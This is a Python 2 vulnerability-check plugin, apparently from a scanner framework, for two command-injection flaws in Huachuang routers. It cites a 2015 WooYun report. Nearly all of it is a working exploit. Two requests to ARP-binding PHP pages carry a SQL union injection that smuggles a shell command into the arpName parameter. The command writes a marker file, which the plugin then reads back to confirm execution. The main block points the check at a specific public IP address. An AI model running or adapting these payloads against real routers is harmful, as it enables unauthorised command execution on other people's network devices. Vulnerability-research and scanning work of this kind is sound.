#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 华创路由器两处命令执行
refer: http://www.wooyun.org/bugs/wooyun-2015-0135123
description:
'''

import urlparse


def assign(service, arg):
    if service == 'huachuang_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payloads = [
        arg + 'acc/bindipmac/static_arp_bind.php?arpName=1%27%20and%200%20union%20select%201,%27woo||echo%20"testvul0">test.txt||yun%27,3,4,5,6,7,8--',
        arg + 'acc/bindipmac/static_arp_del.php?x=1&arpName=1%27%20and%200%20union%20select%201,%27woo||echo%20"testvul1">test.txt||yun%27,3,4,5,6,7,8--'
    ]
    for i in range(len(payloads)):
        payload = payloads[i]
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200:
            #verify
            code, head, res, err, _ = curl.curl2(arg + 'acc/bindipmac/test.txt')
            if code == 200 and ("testvul"+str(i)) in res:
                security_hole("命令执行: "+payload)

    
if __name__ == '__main__':
    from dummy import *
    audit(assign('huachuang_router','http://118.26.68.2/')[1])